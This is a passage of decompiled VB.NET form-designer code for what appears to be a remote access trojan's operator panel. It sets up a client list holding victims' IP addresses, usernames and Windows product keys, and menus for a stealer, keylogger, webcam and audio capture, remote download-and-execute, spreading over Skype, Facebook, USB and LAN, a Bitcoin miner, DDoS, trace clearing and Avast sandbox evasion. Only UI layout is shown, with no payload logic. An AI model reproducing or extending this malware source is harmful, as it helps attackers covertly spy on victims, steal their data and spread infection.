            Me.ServerEditorToolStripMenuItem = New ToolStripMenuItem
            Me.BinderToolStripMenuItem = New ToolStripMenuItem
            Me.FormGrabberToolStripMenuItem = New ToolStripMenuItem
            Me.ExtraToolStripMenuItem = New ToolStripMenuItem
            Me.PortScannerToolStripMenuItem = New ToolStripMenuItem
            Me.ResHackerToolStripMenuItem = New ToolStripMenuItem
            Me.ExtensionChangerToolStripMenuItem = New ToolStripMenuItem
            Me.BinderToolStripMenuItem1 = New ToolStripMenuItem
            Me.AntiAvastSandBoxToolStripMenuItem = New ToolStripMenuItem
            Me.txtListening = New ToolStripStatusLabel
            Me.ToolStripStatusLabel1 = New ToolStripStatusLabel
            Me.StatusStrip1 = New StatusStrip
            Me.txtOnline = New ToolStripStatusLabel
            Me.ToolStripSplitButton1 = New ToolStripSplitButton
            Me.NumberOfConnectionsMaxToolStripMenuItem = New ToolStripMenuItem
            Me.ToolStripSeparator7 = New ToolStripSeparator
            Me.ToolStripTextBox14 = New ToolStripTextBox
            Me.ToolStripStatusLabel2 = New ToolStripStatusLabel
            Me.ContextMenuStrip2 = New ContextMenuStrip(Me.icontainer_0)
            Me.SaveToFileToolStripMenuItem = New ToolStripMenuItem
            Me.NotifyIcon1 = New NotifyIcon(Me.icontainer_0)
            Me.ContextMenuStrip3 = New ContextMenuStrip(Me.icontainer_0)
            Me.ShowToolStripMenuItem = New ToolStripMenuItem
            Me.ExitToolStripMenuItem1 = New ToolStripMenuItem
            Me.Timer1 = New Timer(Me.icontainer_0)
            Me.getloggg = New TextBox
            Me.textsteam = New TextBox
            Me.RichTextBox3 = New RichTextBox
            Me.RichTextBox4 = New RichTextBox
            Me.SideTab1 = New Control0
            Me.TabPage1 = New TabPage
            Me.RichTextBox2 = New RichTextBox
            Me.lstClients = New ListView
            Me.lstipaddress = New ColumnHeader
            Me.lstversion = New ColumnHeader
            Me.lststatus = New ColumnHeader
            Me.lstcpname = New ColumnHeader
            Me.lstusername = New ColumnHeader
            Me.lstwinprckey = New ColumnHeader
            Me.lstopsys = New ColumnHeader
            Me.lstcountry = New ColumnHeader
            Me.lstping = New ColumnHeader
            Me.TabPage2 = New TabPage
            Me.ListView1 = New ListView
            Me.ColumnHeader7 = New ColumnHeader
            Me.ColumnHeader8 = New ColumnHeader
            Me.TabPage4 = New TabPage
            Me.Win8Progressbar1 = New Win8Progressbar
            Me.Button1 = New Button
            Me.CheckBox1 = New CheckBox
            Me.Label2 = New Label
            Me.TextBox1 = New TextBox
            Me.PictureBox1 = New PictureBox
            Me.TabPage5 = New TabPage
            Me.Button2 = New Button
            Me.TextBox2 = New TextBox
            Me.ComboBox1 = New ComboBox
            Me.TabPage3 = New TabPage
            Me.ContextMenuStrip1.SuspendLayout
            Me.MenuStrip1.SuspendLayout
            Me.StatusStrip1.SuspendLayout
            Me.ContextMenuStrip2.SuspendLayout
            Me.ContextMenuStrip3.SuspendLayout
            Me.SideTab1.SuspendLayout
            Me.TabPage1.SuspendLayout
            Me.TabPage2.SuspendLayout
            Me.TabPage4.SuspendLayout
            DirectCast(Me.PictureBox1, ISupportInitialize).BeginInit
            Me.TabPage5.SuspendLayout
            Me.SuspendLayout
            Me.ContextMenuStrip1.Items.AddRange(New ToolStripItem() { Me.ListenToolStripMenuItem, Me.StopToolStripMenuItem, Me.RefreshToolStripMenuItem, Me.ToolStripMenuItem1, Me.ShowSystemInformationToolStripMenuItem, Me.ViewRemoteDesktopToolStripMenuItem, Me.WebcamToolStripMenuItem, Me.FunStuffToolStripMenuItem, Me.ProcessesToolStripMenuItem, Me.RecordAudioToolStripMenuItem, Me.ComputerToolStripMenuItem, Me.StealerToolStripMenuItem, Me.RemoteFileManagerToolStripMenuItem, Me.KeyloggzeToolStripMenuItem, Me.OpenWebsiteToolStripMenuItem, Me.VisitWebsiteToolStripMenuItem, Me.RemoteDownloadExecuteToolStripMenuItem, Me.FileManagerToolStripMenuItem, Me.SpreadToolStripMenuItem, Me.HideShowColumsToolStripMenuItem, Me.Sock5ToolStripMenuItem, Me.TracerouteIPToolStripMenuItem, Me.BotkillToolStripMenuItem, Me.BitCoinMinerToolStripMenuItem, Me.DDOSToolStripMenuItem, Me.ServerToolStripMenuItem })
            Me.ContextMenuStrip1.Name = "ContextMenuStrip1"
            Me.ContextMenuStrip1.RenderMode = ToolStripRenderMode.Professional
            Dim size As New Size(&HCE, 560)
            Me.ContextMenuStrip1.Size = size
            Me.ListenToolStripMenuItem.Image = DirectCast(manager.GetObject("ListenToolStripMenuItem.Image"), Image)
            Me.ListenToolStripMenuItem.Name = "ListenToolStripMenuItem"
            size = New Size(&HCD, &H16)
            Me.ListenToolStripMenuItem.Size = size
            Me.ListenToolStripMenuItem.Text = "Listen"
            Me.StopToolStripMenuItem.Image = DirectCast(manager.GetObject("StopToolStripMenuItem.Image"), Image)
            Me.StopToolStripMenuItem.Name = "StopToolStripMenuItem"
            size = New Size(&HCD, &H16)
            Me.StopToolStripMenuItem.Size = size
            Me.StopToolStripMenuItem.Text = "Stop"
            Me.RefreshToolStripMenuItem.Image = DirectCast(manager.GetObject("RefreshToolStripMenuItem.Image"), Image)
            Me.RefreshToolStripMenuItem.Name = "RefreshToolStripMenuItem"
            size = New Size(&HCD, &H16)
            Me.RefreshToolStripMenuItem.Size = size
            Me.RefreshToolStripMenuItem.Text = "Refresh"
            Me.ToolStripMenuItem1.Name = "ToolStripMenuItem1"
            size = New Size(&HCA, 6)
            Me.ToolStripMenuItem1.Size = size
            Me.ShowSystemInformationToolStripMenuItem.Image = DirectCast(manager.GetObject("ShowSystemInformationToolStripMenuItem.Image"), Image)
            Me.ShowSystemInformationToolStripMenuItem.Name = "ShowSystemInformationToolStripMenuItem"
            size = New Size(&HCD, &H16)
            Me.ShowSystemInformationToolStripMenuItem.Size = size
            Me.ShowSystemInformationToolStripMenuItem.Text = "System Information"
            Me.ViewRemoteDesktopToolStripMenuItem.Image = DirectCast(manager.GetObject("ViewRemoteDesktopToolStripMenuItem.Image"), Image)
            Me.ViewRemoteDesktopToolStripMenuItem.Name = "ViewRemoteDesktopToolStripMenuItem"
            size = New Size(&HCD, &H16)
            Me.ViewRemoteDesktopToolStripMenuItem.Size = size
            Me.ViewRemoteDesktopToolStripMenuItem.Text = "Remote Desktop"
            Me.WebcamToolStripMenuItem.Image = Class5.smethod_91
            Me.WebcamToolStripMenuItem.Name = "WebcamToolStripMenuItem"
            size = New Size(&HCD, &H16)
            Me.WebcamToolStripMenuItem.Size = size
            Me.WebcamToolStripMenuItem.Text = "Webcam"
            Me.FunStuffToolStripMenuItem.DropDownItems.AddRange(New ToolStripItem() { Me.OpenCDToolStripMenuItem, Me.CloseCDToolStripMenuItem, Me.ToolStripSeparator1, Me.SpeakComputerToolStripMenuItem, Me.ToolStripSeparator2, Me.PlayMusicToolStripMenuItem, Me.ToolStripSeparator4, Me.MessageBoxToolStripMenuItem1, Me.ToolStripSeparator13, Me.HideTaskbarToolStripMenuItem, Me.ShowTaskbarToolStripMenuItem, Me.ToolStripSeparator3, Me.MsnControlToolStripMenuItem, Me.ToolStripSeparator6, Me.BipSoundToolStripMenuItem, Me.ToolStripSeparator8, Me.RandomIconDesktopToolStripMenuItem, Me.ToolStripSeparator10, Me.RandomCursorToolStripMenuItem, Me.ToolStripSeparator11, Me.BSODToolStripMenuItem, Me.ToolStripSeparator9, Me.SwapMouseButtonToolStripMenuItem, Me.FixMouseButtonToolStripMenuItem, Me.ToolStripSeparator12, Me.MatrixScreenToolStripMenuItem })
            Me.FunStuffToolStripMenuItem.Image = DirectCast(manager.GetObject("FunStuffToolStripMenuItem.Image"), Image)
            Me.FunStuffToolStripMenuItem.Name = "FunStuffToolStripMenuItem"
            size = New Size(&HCD, &H16)
            Me.FunStuffToolStripMenuItem.Size = size
            Me.FunStuffToolStripMenuItem.Text = "Fun Stuff"
            Me.OpenCDToolStripMenuItem.Image = DirectCast(manager.GetObject("OpenCDToolStripMenuItem.Image"), Image)
            Me.OpenCDToolStripMenuItem.Name = "OpenCDToolStripMenuItem"
            size = New Size(&HB0, &H16)
            Me.OpenCDToolStripMenuItem.Size = size
            Me.OpenCDToolStripMenuItem.Text = "Open DVD"
            Me.CloseCDToolStripMenuItem.Image = DirectCast(manager.GetObject("CloseCDToolStripMenuItem.Image"), Image)
            Me.CloseCDToolStripMenuItem.Name = "CloseCDToolStripMenuItem"
            size = New Size(&HB0, &H16)
            Me.CloseCDToolStripMenuItem.Size = size
            Me.CloseCDToolStripMenuItem.Text = "Close DVD"
            Me.ToolStripSeparator1.Name = "ToolStripSeparator1"
            size = New Size(&HAD, 6)
            Me.ToolStripSeparator1.Size = size
            Me.SpeakComputerToolStripMenuItem.DropDownItems.AddRange(New ToolStripItem() { Me.ToolStripTextBox1, Me.OkToolStripMenuItem })
            Me.SpeakComputerToolStripMenuItem.Image = DirectCast(manager.GetObject("SpeakComputerToolStripMenuItem.Image"), Image)
            Me.SpeakComputerToolStripMenuItem.Name = "SpeakComputerToolStripMenuItem"
            size = New Size(&HB0, &H16)
            Me.SpeakComputerToolStripMenuItem.Size = size
            Me.SpeakComputerToolStripMenuItem.Text = "Speak Computer"
            Me.ToolStripTextBox1.Font = New Font("Tahoma", 8.25!)
            Me.ToolStripTextBox1.Name = "ToolStripTextBox1"
            size = New Size(100, &H15)
            Me.ToolStripTextBox1.Size = size
            Me.ToolStripTextBox1.Text = "You Fail ! "
            Me.OkToolStripMenuItem.Image = Class5.smethod_7
            Me.OkToolStripMenuItem.Name = "OkToolStripMenuItem"
            size = New Size(160, &H16)
            Me.OkToolStripMenuItem.Size = size
            Me.OkToolStripMenuItem.Text = ":: Ok ::"
            Me.ToolStripSeparator2.Name = "ToolStripSeparator2"
            size = New Size(&HAD, 6)
            Me.ToolStripSeparator2.Size = size
            Me.PlayMusicToolStripMenuItem.DropDownItems.AddRange(New ToolStripItem() { Me.ToolStripTextBox6, Me.OkToolStripMenuItem5 })
            Me.PlayMusicToolStripMenuItem.Image = Class5.smethod_57
            Me.PlayMusicToolStripMenuItem.Name = "PlayMusicToolStripMenuItem"
            size = New Size(&HB0, &H16)
            Me.PlayMusicToolStripMenuItem.Size = size
            Me.PlayMusicToolStripMenuItem.Text = "Play Music"
            Me.ToolStripTextBox6.Font = New Font("Tahoma", 8.25!)
            Me.ToolStripTextBox6.Name = "ToolStripTextBox6"
            size = New Size(100, &H15)
            Me.ToolStripTextBox6.Size = size
            Me.ToolStripTextBox6.Text = "http://www.site.com/try.wav"
            Me.OkToolStripMenuItem5.Image = Class5.smethod_7
            Me.OkToolStripMenuItem5.Name = "OkToolStripMenuItem5"
            size = New Size(160, &H16)
            Me.OkToolStripMenuItem5.Size = size
            Me.OkToolStripMenuItem5.Text = ":: Ok ::"
            Me.ToolStripSeparator4.Name = "ToolStripSeparator4"
            size = New Size(&HAD, 6)
            Me.ToolStripSeparator4.Size = size
            Me.MessageBoxToolStripMenuItem1.Image = Class5.smethod_26
            Me.MessageBoxToolStripMenuItem1.Name = "MessageBoxToolStripMenuItem1"
            size = New Size(&HB0, &H16)
            Me.MessageBoxToolStripMenuItem1.Size = size
            Me.MessageBoxToolStripMenuItem1.Text = "Message Box"
            Me.ToolStripSeparator13.Name = "ToolStripSeparator13"
            size = New Size(&HAD, 6)
            Me.ToolStripSeparator13.Size = size
            Me.HideTaskbarToolStripMenuItem.Image = Class5.smethod_38
            Me.HideTaskbarToolStripMenuItem.Name = "HideTaskbarToolStripMenuItem"
            size = New Size(&HB0, &H16)
            Me.HideTaskbarToolStripMenuItem.Size = size
            Me.HideTaskbarToolStripMenuItem.Text = "Hide Taskbar"
            Me.ShowTaskbarToolStripMenuItem.Image = DirectCast(manager.GetObject("ShowTaskbarToolStripMenuItem.Image"), Image)
            Me.ShowTaskbarToolStripMenuItem.Name = "ShowTaskbarToolStripMenuItem"
            size = New Size(&HB0, &H16)
            Me.ShowTaskbarToolStripMenuItem.Size = size
            Me.ShowTaskbarToolStripMenuItem.Text = "Show Taskbar"
            Me.ToolStripSeparator3.Name = "ToolStripSeparator3"
            size = New Size(&HAD, 6)
            Me.ToolStripSeparator3.Size = size
            Me.MsnControlToolStripMenuItem.DropDownItems.AddRange(New ToolStripItem() { Me.FreezeToolStripMenuItem, Me.UnfreezeToolStripMenuItem })
            Me.MsnControlToolStripMenuItem.Image = DirectCast(manager.GetObject("MsnControlToolStripMenuItem.Image"), Image)
            Me.MsnControlToolStripMenuItem.Name = "MsnControlToolStripMenuItem"
            size = New Size(&HB0, &H16)
            Me.MsnControlToolStripMenuItem.Size = size
            Me.MsnControlToolStripMenuItem.Text = "Msn Control"
            Me.FreezeToolStripMenuItem.DropDownItems.AddRange(New ToolStripItem() { Me.ToolStripTextBox3, Me.OkToolStripMenuItem2 })
            Me.FreezeToolStripMenuItem.Image = DirectCast(manager.GetObject("FreezeToolStripMenuItem.Image"), Image)
            Me.FreezeToolStripMenuItem.Name = "FreezeToolStripMenuItem"
            size = New Size(&H74, &H16)
            Me.FreezeToolStripMenuItem.Size = size
            Me.FreezeToolStripMenuItem.Text = "Freeze"
            Me.ToolStripTextBox3.Font = New Font("Tahoma", 8.25!)
            Me.ToolStripTextBox3.Name = "ToolStripTextBox3"
            size = New Size(100, &H15)
            Me.ToolStripTextBox3.Size = size
            Me.ToolStripTextBox3.Text = "email@hotmail.fr"
            Me.OkToolStripMenuItem2.Image = Class5.smethod_7
            Me.OkToolStripMenuItem2.Name = "OkToolStripMenuItem2"
            size = New Size(160, &H16)
            Me.OkToolStripMenuItem2.Size = size
            Me.OkToolStripMenuItem2.Text = ":: Ok ::"
            Me.UnfreezeToolStripMenuItem.DropDownItems.AddRange(New ToolStripItem() { Me.ToolStripTextBox4, Me.OkToolStripMenuItem3 })
            Me.UnfreezeToolStripMenuItem.Image = DirectCast(manager.GetObject("UnfreezeToolStripMenuItem.Image"), Image)
            Me.UnfreezeToolStripMenuItem.Name = "UnfreezeToolStripMenuItem"
            size = New Size(&H74, &H16)
            Me.UnfreezeToolStripMenuItem.Size = size
            Me.UnfreezeToolStripMenuItem.Text = "Unfreeze"
            Me.ToolStripTextBox4.Font = New Font("Tahoma", 8.25!)
            Me.ToolStripTextBox4.Name = "ToolStripTextBox4"
            size = New Size(100, &H15)
            Me.ToolStripTextBox4.Size = size
            Me.ToolStripTextBox4.Text = "email@hotmail.fr"
            Me.OkToolStripMenuItem3.Image = Class5.smethod_7
            Me.OkToolStripMenuItem3.Name = "OkToolStripMenuItem3"
            size = New Size(160, &H16)
            Me.OkToolStripMenuItem3.Size = size
            Me.OkToolStripMenuItem3.Text = ":: Ok ::"
            Me.ToolStripSeparator6.Name = "ToolStripSeparator6"
            size = New Size(&HAD, 6)
            Me.ToolStripSeparator6.Size = size
            Me.BipSoundToolStripMenuItem.Image = DirectCast(manager.GetObject("BipSoundToolStripMenuItem.Image"), Image)
            Me.BipSoundToolStripMenuItem.Name = "BipSoundToolStripMenuItem"
            size = New Size(&HB0, &H16)
            Me.BipSoundToolStripMenuItem.Size = size
            Me.BipSoundToolStripMenuItem.Text = "Bip Sound "
            Me.ToolStripSeparator8.Name = "ToolStripSeparator8"
            size = New Size(&HAD, 6)
            Me.ToolStripSeparator8.Size = size
            Me.RandomIconDesktopToolStripMenuItem.Image = DirectCast(manager.GetObject("RandomIconDesktopToolStripMenuItem.Image"), Image)
            Me.RandomIconDesktopToolStripMenuItem.Name = "RandomIconDesktopToolStripMenuItem"
            size = New Size(&HB0, &H16)
            Me.RandomIconDesktopToolStripMenuItem.Size = size
            Me.RandomIconDesktopToolStripMenuItem.Text = "Random Icon Desktop"
            Me.ToolStripSeparator10.Name = "ToolStripSeparator10"
            size = New Size(&HAD, 6)
            Me.ToolStripSeparator10.Size = size
            Me.RandomCursorToolStripMenuItem.Image = DirectCast(manager.GetObject("RandomCursorToolStripMenuItem.Image"), Image)
            Me.RandomCursorToolStripMenuItem.Name = "RandomCursorToolStripMenuItem"
            size = New Size(&HB0, &H16)
            Me.RandomCursorToolStripMenuItem.Size = size
            Me.RandomCursorToolStripMenuItem.Text = "Random Cursor"
            Me.ToolStripSeparator11.Name = "ToolStripSeparator11"
            size = New Size(&HAD, 6)
            Me.ToolStripSeparator11.Size = size
            Me.BSODToolStripMenuItem.Image = Class5.smethod_16
            Me.BSODToolStripMenuItem.Name = "BSODToolStripMenuItem"
            size = New Size(&HB0, &H16)
            Me.BSODToolStripMenuItem.Size = size
            Me.BSODToolStripMenuItem.Text = "BSOD"
            Me.ToolStripSeparator9.Name = "ToolStripSeparator9"
            size = New Size(&HAD, 6)
            Me.ToolStripSeparator9.Size = size
            Me.SwapMouseButtonToolStripMenuItem.Image = Class5.smethod_55
            Me.SwapMouseButtonToolStripMenuItem.Name = "SwapMouseButtonToolStripMenuItem"
            size = New Size(&HB0, &H16)
            Me.SwapMouseButtonToolStripMenuItem.Size = size
            Me.SwapMouseButtonToolStripMenuItem.Text = "Swap Mouse Button"
            Me.FixMouseButtonToolStripMenuItem.Image = Class5.smethod_56
            Me.FixMouseButtonToolStripMenuItem.Name = "FixMouseButtonToolStripMenuItem"
            size = New Size(&HB0, &H16)
            Me.FixMouseButtonToolStripMenuItem.Size = size
            Me.FixMouseButtonToolStripMenuItem.Text = "Fix Mouse Button"
            Me.ToolStripSeparator12.Name = "ToolStripSeparator12"
            size = New Size(&HAD, 6)
            Me.ToolStripSeparator12.Size = size
            Me.MatrixScreenToolStripMenuItem.Image = DirectCast(manager.GetObject("MatrixScreenToolStripMenuItem.Image"), Image)
            Me.MatrixScreenToolStripMenuItem.Name = "MatrixScreenToolStripMenuItem"
            size = New Size(&HB0, &H16)
            Me.MatrixScreenToolStripMenuItem.Size = size
            Me.MatrixScreenToolStripMenuItem.Text = "Matrix"
            Me.ProcessesToolStripMenuItem.DropDownItems.AddRange(New ToolStripItem() { Me.ListToolStripMenuItem, Me.StartToolStripMenuItem3, Me.KillToolStripMenuItem })
            Me.ProcessesToolStripMenuItem.Image = DirectCast(manager.GetObject("ProcessesToolStripMenuItem.Image"), Image)
            Me.ProcessesToolStripMenuItem.Name = "ProcessesToolStripMenuItem"
            size = New Size(&HCD, &H16)
            Me.ProcessesToolStripMenuItem.Size = size
            Me.ProcessesToolStripMenuItem.Text = "Processes"
            Me.ListToolStripMenuItem.Image = DirectCast(manager.GetObject("ListToolStripMenuItem.Image"), Image)
            Me.ListToolStripMenuItem.Name = "ListToolStripMenuItem"
            size = New Size(&H61, &H16)
            Me.ListToolStripMenuItem.Size = size
            Me.ListToolStripMenuItem.Text = "List"
            Me.StartToolStripMenuItem3.Image = DirectCast(manager.GetObject("StartToolStripMenuItem3.Image"), Image)
            Me.StartToolStripMenuItem3.Name = "StartToolStripMenuItem3"
            size = New Size(&H61, &H16)
            Me.StartToolStripMenuItem3.Size = size
            Me.StartToolStripMenuItem3.Text = "Start"
            Me.KillToolStripMenuItem.Image = DirectCast(manager.GetObject("KillToolStripMenuItem.Image"), Image)
            Me.KillToolStripMenuItem.Name = "KillToolStripMenuItem"
            size = New Size(&H61, &H16)
            Me.KillToolStripMenuItem.Size = size
            Me.KillToolStripMenuItem.Text = "Kill"
            Me.RecordAudioToolStripMenuItem.DropDownItems.AddRange(New ToolStripItem() { Me.RecordToolStripMenuItem, Me.StopRecordToolStripMenuItem, Me.ToolStripSeparator5, Me.GetRecordToolStripMenuItem })
            Me.RecordAudioToolStripMenuItem.Image = DirectCast(manager.GetObject("RecordAudioToolStripMenuItem.Image"), Image)
            Me.RecordAudioToolStripMenuItem.Name = "RecordAudioToolStripMenuItem"
            size = New Size(&HCD, &H16)
            Me.RecordAudioToolStripMenuItem.Size = size
            Me.RecordAudioToolStripMenuItem.Text = "Record Audio"
            Me.RecordToolStripMenuItem.Image = Class5.smethod_52
            Me.RecordToolStripMenuItem.Name = "RecordToolStripMenuItem"
            size = New Size(&H84, &H16)
            Me.RecordToolStripMenuItem.Size = size
            Me.RecordToolStripMenuItem.Text = "Start Record"
            Me.StopRecordToolStripMenuItem.Image = DirectCast(manager.GetObject("StopRecordToolStripMenuItem.Image"), Image)
            Me.StopRecordToolStripMenuItem.Name = "StopRecordToolStripMenuItem"
            size = New Size(&H84, &H16)
            Me.StopRecordToolStripMenuItem.Size = size
            Me.StopRecordToolStripMenuItem.Text = "Stop Record"
            Me.ToolStripSeparator5.Name = "ToolStripSeparator5"
            size = New Size(&H81, 6)
            Me.ToolStripSeparator5.Size = size
            Me.GetRecordToolStripMenuItem.Image = DirectCast(manager.GetObject("GetRecordToolStripMenuItem.Image"), Image)
            Me.GetRecordToolStripMenuItem.Name = "GetRecordToolStripMenuItem"
            size = New Size(&H84, &H16)
            Me.GetRecordToolStripMenuItem.Size = size
            Me.GetRecordToolStripMenuItem.Text = "Get Record"
            Me.ComputerToolStripMenuItem.DropDownItems.AddRange(New ToolStripItem() { Me.RestartToolStripMenuItem, Me.ShutdownToolStripMenuItem, Me.EnableMouseAndKeyboardToolStripMenuItem, Me.DisableMouseAndKeyboardToolStripMenuItem, Me.ClearTraceHistoryToolStripMenuItem })
            Me.ComputerToolStripMenuItem.Image = DirectCast(manager.GetObject("ComputerToolStripMenuItem.Image"), Image)
            Me.ComputerToolStripMenuItem.Name = "ComputerToolStripMenuItem"
            size = New Size(&HCD, &H16)
            Me.ComputerToolStripMenuItem.Size = size
            Me.ComputerToolStripMenuItem.Text = "Computer"
            Me.RestartToolStripMenuItem.Image = DirectCast(manager.GetObject("RestartToolStripMenuItem.Image"), Image)
            Me.RestartToolStripMenuItem.Name = "RestartToolStripMenuItem"
            size = New Size(&HD3, &H16)
            Me.RestartToolStripMenuItem.Size = size
            Me.RestartToolStripMenuItem.Text = "Restart"
            Me.ShutdownToolStripMenuItem.Image = DirectCast(manager.GetObject("ShutdownToolStripMenuItem.Image"), Image)
            Me.ShutdownToolStripMenuItem.Name = "ShutdownToolStripMenuItem"
            size = New Size(&HD3, &H16)
            Me.ShutdownToolStripMenuItem.Size = size
            Me.ShutdownToolStripMenuItem.Text = "Shutdown"
            Me.EnableMouseAndKeyboardToolStripMenuItem.Image = DirectCast(manager.GetObject("EnableMouseAndKeyboardToolStripMenuItem.Image"), Image)
            Me.EnableMouseAndKeyboardToolStripMenuItem.Name = "EnableMouseAndKeyboardToolStripMenuItem"
            size = New Size(&HD3, &H16)
            Me.EnableMouseAndKeyboardToolStripMenuItem.Size = size
            Me.EnableMouseAndKeyboardToolStripMenuItem.Text = "Enable Mouse And Keyboard"
            Me.DisableMouseAndKeyboardToolStripMenuItem.Image = DirectCast(manager.GetObject("DisableMouseAndKeyboardToolStripMenuItem.Image"), Image)
            Me.DisableMouseAndKeyboardToolStripMenuItem.Name = "DisableMouseAndKeyboardToolStripMenuItem"
            size = New Size(&HD3, &H16)
            Me.DisableMouseAndKeyboardToolStripMenuItem.Size = size
            Me.DisableMouseAndKeyboardToolStripMenuItem.Text = "Disable Mouse And Keyboard"
            Me.ClearTraceHistoryToolStripMenuItem.Image = Class5.smethod_21
            Me.ClearTraceHistoryToolStripMenuItem.Name = "ClearTraceHistoryToolStripMenuItem"
            size = New Size(&HD3, &H16)
            Me.ClearTraceHistoryToolStripMenuItem.Size = size
            Me.ClearTraceHistoryToolStripMenuItem.Text = "Clear Trace/History"
            Me.StealerToolStripMenuItem.Image = DirectCast(manager.GetObject("StealerToolStripMenuItem.Image"), Image)
            Me.StealerToolStripMenuItem.Name = "StealerToolStripMenuItem"
            size = New Size(&HCD, &H16)
            Me.StealerToolStripMenuItem.Size = size
            Me.StealerToolStripMenuItem.Text = "Stealer"
            Me.RemoteFileManagerToolStripMenuItem.Image = DirectCast(manager.GetObject("RemoteFileManagerToolStripMenuItem.Image"), Image)
            Me.RemoteFileManagerToolStripMenuItem.Name = "RemoteFileManagerToolStripMenuItem"
            size = New Size(&HCD, &H16)
            Me.RemoteFileManagerToolStripMenuItem.Size = size
            Me.RemoteFileManagerToolStripMenuItem.Text = "Remote File Manager"
            Me.KeyloggzeToolStripMenuItem.Image = Class5.smethod_36
            Me.KeyloggzeToolStripMenuItem.Name = "KeyloggzeToolStripMenuItem"
            size = New Size(&HCD, &H16)
            Me.KeyloggzeToolStripMenuItem.Size = size
            Me.KeyloggzeToolStripMenuItem.Text = "Keylogger"
            Me.OpenWebsiteToolStripMenuItem.Image = DirectCast(manager.GetObject("OpenWebsiteToolStripMenuItem.Image"), Image)
            Me.OpenWebsiteToolStripMenuItem.Name = "OpenWebsiteToolStripMenuItem"
            size = New Size(&HCD, &H16)
            Me.OpenWebsiteToolStripMenuItem.Size = size
            Me.OpenWebsiteToolStripMenuItem.Text = "Open Website"
            Me.VisitWebsiteToolStripMenuItem.Image = Class5.smethod_38
            Me.VisitWebsiteToolStripMenuItem.Name = "VisitWebsiteToolStripMenuItem"
            size = New Size(&HCD, &H16)
            Me.VisitWebsiteToolStripMenuItem.Size = size
            Me.VisitWebsiteToolStripMenuItem.Text = "Visit Website"
            Me.RemoteDownloadExecuteToolStripMenuItem.Image = DirectCast(manager.GetObject("RemoteDownloadExecuteToolStripMenuItem.Image"), Image)
            Me.RemoteDownloadExecuteToolStripMenuItem.Name = "RemoteDownloadExecuteToolStripMenuItem"
            size = New Size(&HCD, &H16)
            Me.RemoteDownloadExecuteToolStripMenuItem.Size = size
            Me.RemoteDownloadExecuteToolStripMenuItem.Text = "Remote Download \ Execute"
            Me.FileManagerToolStripMenuItem.Image = DirectCast(manager.GetObject("FileManagerToolStripMenuItem.Image"), Image)
            Me.FileManagerToolStripMenuItem.Name = "FileManagerToolStripMenuItem"
            size = New Size(&HCD, &H16)
            Me.FileManagerToolStripMenuItem.Size = size
            Me.FileManagerToolStripMenuItem.Text = "Chat"
            Me.SpreadToolStripMenuItem.DropDownItems.AddRange(New ToolStripItem() { Me.SkypeToolStripMenuItem, Me.FacebookToolStripMenuItem, Me.UsbToolStripMenuItem, Me.LanToolStripMenuItem })
            Me.SpreadToolStripMenuItem.Image = DirectCast(manager.GetObject("SpreadToolStripMenuItem.Image"), Image)
            Me.SpreadToolStripMenuItem.Name = "SpreadToolStripMenuItem"
            size = New Size(&HCD, &H16)
            Me.SpreadToolStripMenuItem.Size = size
            Me.SpreadToolStripMenuItem.Text = "Spread"
            Me.SkypeToolStripMenuItem.DropDownItems.AddRange(New ToolStripItem() { Me.ToolStripTextBox2, Me.OkToolStripMenuItem1 })
            Me.SkypeToolStripMenuItem.Image = DirectCast(manager.GetObject("SkypeToolStripMenuItem.Image"), Image)
            Me.SkypeToolStripMenuItem.Name = "SkypeToolStripMenuItem"
            size = New Size(&H77, &H16)
            Me.SkypeToolStripMenuItem.Size = size
            Me.SkypeToolStripMenuItem.Text = "Skype"
            Me.ToolStripTextBox2.Font = New Font("Tahoma", 8.25!)
            Me.ToolStripTextBox2.Name = "ToolStripTextBox2"
            size = New Size(100, &H15)
            Me.ToolStripTextBox2.Size = size
            Me.ToolStripTextBox2.Text = "Text to spread"
            Me.OkToolStripMenuItem1.Image = Class5.smethod_7
            Me.OkToolStripMenuItem1.Name = "OkToolStripMenuItem1"
            size = New Size(160, &H16)
            Me.OkToolStripMenuItem1.Size = size
            Me.OkToolStripMenuItem1.Text = ":: Ok ::"
            Me.FacebookToolStripMenuItem.DropDownItems.AddRange(New ToolStripItem() { Me.ToolStripTextBox13, Me.OkToolStripMenuItem7 })
            Me.FacebookToolStripMenuItem.Image = Class5.smethod_30
            Me.FacebookToolStripMenuItem.Name = "FacebookToolStripMenuItem"
            size = New Size(&H77, &H16)
            Me.FacebookToolStripMenuItem.Size = size
            Me.FacebookToolStripMenuItem.Text = "Facebook"
            Me.ToolStripTextBox13.Name = "ToolStripTextBox13"
            size = New Size(100, &H15)
            Me.ToolStripTextBox13.Size = size
            Me.ToolStripTextBox13.Text = "Message to spread"
            Me.OkToolStripMenuItem7.Image = Class5.smethod_7
            Me.OkToolStripMenuItem7.Name = "OkToolStripMenuItem7"
            size = New Size(160, &H16)
            Me.OkToolStripMenuItem7.Size = size
            Me.OkToolStripMenuItem7.Text = ":: Ok ::"
            Me.UsbToolStripMenuItem.Image = Class5.smethod_90
            Me.UsbToolStripMenuItem.Name = "UsbToolStripMenuItem"
            size = New Size(&H77, &H16)
            Me.UsbToolStripMenuItem.Size = size
            Me.UsbToolStripMenuItem.Text = "Usb"
            Me.LanToolStripMenuItem.Image = Class5.smethod_73
            Me.LanToolStripMenuItem.Name = "LanToolStripMenuItem"
            size = New Size(&H77, &H16)
            Me.LanToolStripMenuItem.Size = size
            Me.LanToolStripMenuItem.Text = "Lan"
            Me.HideShowColumsToolStripMenuItem.DropDownItems.AddRange(New ToolStripItem() { Me.IPAdressToolStripMenuItem, Me.VersionToolStripMenuItem, Me.StatusToolStripMenuItem, Me.ComputerNameToolStripMenuItem, Me.UsernameToolStripMenuItem, Me.WindowsKeyToolStripMenuItem, Me.OSToolStripMenuItem, Me.CountryToolStripMenuItem, Me.PingToolStripMenuItem })
            Me.HideShowColumsToolStripMenuItem.Image = Class5.smethod_15
            Me.HideShowColumsToolStripMenuItem.Name = "HideShowColumsToolStripMenuItem"
            size = New Size(&HCD, &H16)
            Me.HideShowColumsToolStripMenuItem.Size = size
            Me.HideShowColumsToolStripMenuItem.Text = "Hide/Show Columns"
            Me.IPAdressToolStripMenuItem.Checked = True
            Me.IPAdressToolStripMenuItem.CheckState = CheckState.Checked
            Me.IPAdressToolStripMenuItem.Name = "IPAdressToolStripMenuItem"
            size = New Size(&H97, &H16)
            Me.IPAdressToolStripMenuItem.Size = size
            Me.IPAdressToolStripMenuItem.Text = "IP Address"
            Me.VersionToolStripMenuItem.Checked = True
            Me.VersionToolStripMenuItem.CheckState = CheckState.Checked
            Me.VersionToolStripMenuItem.Name = "VersionToolStripMenuItem"
